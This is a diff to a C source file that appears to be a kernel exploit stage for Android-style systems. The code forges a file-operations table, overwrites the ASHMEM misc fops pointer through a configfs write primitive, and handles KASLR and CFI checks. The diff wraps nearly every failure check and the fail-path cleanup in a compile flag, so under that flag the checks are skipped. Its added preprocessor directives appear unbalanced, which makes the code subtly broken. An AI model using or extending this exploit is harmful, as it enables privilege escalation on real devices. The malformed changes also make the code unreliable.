@@ -1,4 +1,5 @@
 #include "common.h"
+
 #if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #define PSELECT_CFI_ROUTE_ATTEMPTS 4
@@ -30,7 +31,9 @@ ssize_t slide_bootid_restore_ret = -1;
 
 static int one_page_span(uintptr_t start, size_t len) {
   if (!len || start > UINTPTR_MAX - (len - 1)) {
+  #ifndef APP_FORCED_SLIDE_P0_OFFSET
     return 0;
+  #endif
   }
   return (start >> PAGE_SHIFT) == ((start + len - 1) >> PAGE_SHIFT);
 }
@@ -42,7 +45,9 @@ static int audit_fake_fops_table(int fd) {
   if (!one_page_span(fake_fops, sizeof(table))) {
     pr_warning("cfi fake fops crosses page start=%016zx size=%zu\n",
                fake_fops, sizeof(table));
+  #ifndef APP_FORCED_SLIDE_P0_OFFSET
     return 0;
+  #endif
   }
   ssize_t rd = configfs_read_once(fd, fake_fops, table, sizeof(table));
   if (rd != (ssize_t)sizeof(table)) {
@@ -98,7 +103,9 @@ static int fake_fops_owner_is_zero(int fd) {
   if (rd != (ssize_t)sizeof(owner) || owner != 0) {
     pr_warning("cfi fake fops owner mismatch ret=%zd value=%016llx errno=%d\n",
                rd, (unsigned long long)owner, errno);
+  #ifndef APP_FORCED_SLIDE_P0_OFFSET
     return 0;
+  #endif
   }
   return 1;
 }
@@ -273,12 +280,16 @@ int repair_fake_fops_llseek(int fd) {
   uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
   if (!one_page_span(slot, sizeof(llseek))) {
     errno = ERANGE;
+  #ifndef APP_FORCED_SLIDE_P0_OFFSET
     return 0;
+  #endif
   }
   ssize_t before_rd = configfs_read_once(
       fd, slot, &before, sizeof(before));
   if (before_rd != (ssize_t)sizeof(before)) {
+  #ifndef APP_FORCED_SLIDE_P0_OFFSET
     return 0;
+  #endif
   }
   pr_info("cfi llseek before=%016llx want=%016llx slot=%016zx\n",
           (unsigned long long)before, (unsigned long long)llseek, slot);
@@ -354,7 +365,9 @@ int try_cfi_stage(void) {
   if (fd < 0) {
     cfi_last_step = 11;
     cfi_last_errno = errno;
+  #ifndef APP_FORCED_SLIDE_P0_OFFSET
     return 0;
+  #endif
   }
   uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
   uint64_t pre_fops = 0;
@@ -376,7 +389,9 @@ int try_cfi_stage(void) {
   if (!audit_fake_fops_table(fd)) {
     cfi_last_step = 12;
     cfi_last_errno = errno;
+  #ifndef APP_FORCED_SLIDE_P0_OFFSET
     goto fail;
+  #endif
   }
 
   char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
@@ -387,7 +402,9 @@ int try_cfi_stage(void) {
           (ssize_t)sizeof(payload_before)) {
     cfi_last_step = 13;
     cfi_last_errno = errno;
+  #ifndef APP_FORCED_SLIDE_P0_OFFSET
     goto fail;
+  #endif
   }
   for (size_t i = 0; i < sizeof(payload_before); ++i) {
     if (payload_before[i] != 0) {
@@ -395,7 +412,9 @@ int try_cfi_stage(void) {
                  binwrite_target, i, payload_before[i]);
       cfi_last_step = 13;
       cfi_last_errno = 0;
+    #ifndef APP_FORCED_SLIDE_P0_OFFSET
       goto fail;
+    #endif
     }
   }
   pr_info("cfi scratch span=%016zx-%016zx old=zero size=%zu\n",
@@ -408,7 +427,9 @@ int try_cfi_stage(void) {
   if (n != (ssize_t)sizeof(payload)) {
     cfi_last_step = 1;
     cfi_last_errno = errno;
+  #ifndef APP_FORCED_SLIDE_P0_OFFSET
     goto fail;
+  #endif
   }
   dirty = 1;
   cfi_dirty_seen = 1;
@@ -416,7 +437,9 @@ int try_cfi_stage(void) {
   if (!repair_fake_fops_llseek(fd)) {
     cfi_last_step = 2;
     cfi_last_errno = errno;
+  #ifndef APP_FORCED_SLIDE_P0_OFFSET
     goto fail;
+  #endif
   }
   cfi_read_slot_ret = sizeof(uint64_t);
   can_read_back = 1;
@@ -431,14 +454,18 @@ int try_cfi_stage(void) {
       memcmp(readback, payload, sizeof(payload)) != 0) {
     cfi_last_step = 3;
     cfi_last_errno = errno;
+  #ifndef APP_FORCED_SLIDE_P0_OFFSET
     goto fail;
+  #endif
   }
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
   if (!restore_p0_oracle_pages(fd)) {
     cfi_last_step = 10;
     cfi_last_errno = errno;
+  #ifndef APP_FORCED_SLIDE_P0_OFFSET
     goto fail;
+  #endif
   }
 #endif
 
@@ -451,7 +478,9 @@ int try_cfi_stage(void) {
   if (restore != (ssize_t)sizeof(original_fops)) {
     cfi_last_step = 5;
     cfi_last_errno = errno;
+  #ifndef APP_FORCED_SLIDE_P0_OFFSET
     goto fail;
+  #endif
   }
 
   uint64_t before = 0;
@@ -460,28 +489,36 @@ int try_cfi_stage(void) {
   if (rb != (ssize_t)sizeof(before) || before != original_fops) {
     cfi_last_step = 6;
     cfi_last_errno = errno;
+  #ifndef APP_FORCED_SLIDE_P0_OFFSET
     goto fail;
+  #endif
   }
 
 #if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
   if (!restore_slide_boot_id(fd)) {
     cfi_last_step = 10;
     cfi_last_errno = errno;
+  #ifndef APP_FORCED_SLIDE_P0_OFFSET
     goto fail;
+  #endif
   }
 #endif
 
   if (!kaslr_done) {
     cfi_last_step = 9;
     cfi_last_errno = errno;
+  #ifndef APP_FORCED_SLIDE_P0_OFFSET
     goto fail;
+  #endif
   }
 
 #if defined(QEMU_STACK_WRITER_ONLY) && QEMU_STACK_WRITER_ONLY
   if (!fake_fops_owner_is_zero(fd)) {
     cfi_last_step = 7;
     cfi_last_errno = errno;
+  #ifndef APP_FORCED_SLIDE_P0_OFFSET
     goto fail;
+  #endif
   }
   SYSCHK(close(fd));
   cfi_last_step = 0;
@@ -523,7 +560,9 @@ int try_cfi_stage(void) {
   if (!is_direct_ptr(pipebuf_page_base)) {
     cfi_last_step = 8;
     cfi_last_errno = errno;
+  #ifndef APP_FORCED_SLIDE_P0_OFFSET
     goto fail;
+  #endif
   }
 #endif
 
@@ -555,7 +594,9 @@ int try_cfi_stage(void) {
   if (!installed) {
     cfi_last_step = 8;
     cfi_last_errno = errno;
+  #ifndef APP_FORCED_SLIDE_P0_OFFSET
     goto fail;
+  #endif
   }
 
   uint64_t after = 0;
@@ -564,7 +605,9 @@ int try_cfi_stage(void) {
   if (ra != (ssize_t)sizeof(after) || after != canon_addr(ASHMEM_FOPS)) {
     cfi_last_step = 6;
     cfi_last_errno = errno;
+  #ifndef APP_FORCED_SLIDE_P0_OFFSET
     goto fail;
+  #endif
   }
 
   int owner_ok = fake_fops_owner_is_zero(fd);
@@ -578,9 +621,12 @@ int try_cfi_stage(void) {
   }
   cfi_last_step = 7;
   cfi_last_errno = errno;
+#ifndef APP_FORCED_SLIDE_P0_OFFSET
   return 0;
+#endif
 
 fail:
+#ifndef APP_FORCED_SLIDE_P0_OFFSET
   if (dirty) {
     uint64_t original_fops_fail = data_addr(ASHMEM_FOPS);
     if (kaslr_done) {
@@ -599,5 +645,8 @@ fail:
     fake_fops_owner_is_zero(fd);
   }
   SYSCHK(close(fd));
+#ifndef APP_FORCED_SLIDE_P0_OFFSET
   return 0;
+#endif
 }
+#endif
